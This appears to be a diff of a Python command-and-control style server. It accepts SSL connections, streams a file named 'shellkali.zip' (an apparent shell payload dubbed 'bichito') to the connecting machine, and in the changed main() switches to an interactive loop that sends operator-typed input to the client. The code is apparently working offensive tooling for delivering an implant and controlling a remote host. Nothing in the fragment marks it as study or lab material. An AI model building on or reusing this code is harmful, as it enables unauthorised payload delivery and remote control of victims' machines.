@@ -64,15 +64,18 @@ def send_bichito(address):
             (c,a) = s_ssl.accept()
             print('Got connection', a)
             print('Sending bichito...')
-            while 1:
-                filename='shellkali.zip'
+            while True:
+                filename='shellkali__.zip'
                 f = open(filename,'rb')
                 l = f.read(8192)
                 while (l):
                     c.send(l)
                     l = f.read(8192)
                 f.close()
-                c.write(str(input("Enter Something: ")).encode())
+                # c.write(str(input("Enter Something: ")).encode())
+                break
+            print('llae')
+            # break este break rompe todo
             # echo_client(c)
         except socket.error as e:
             print('Error: {0}'.format(e))
@@ -96,7 +99,7 @@ def echo_server(address):
             print('Got connection', a)
             while 1:
                 c.write(str(input("Enter Something: ")).encode())
-            # echo_client(c)
+            echo_client(c)
         except socket.error as e:
             print('Error: {0}'.format(e))
 
@@ -104,8 +107,8 @@ def echo_server(address):
 def main():
     create_config_file_json()
     config_data = get_json_data('config_w.json')
-    send_bichito((socket.gethostbyname(config_data['ip']), config_data['port']))
-    # echo_server((socket.gethostbyname(config_data['ip']), config_data['port']))
+    # send_bichito((socket.gethostbyname(config_data['ip']), config_data['port']))
+    echo_server((socket.gethostbyname(config_data['ip']), config_data['port']))
 
 
 if __name__ == "__main__":
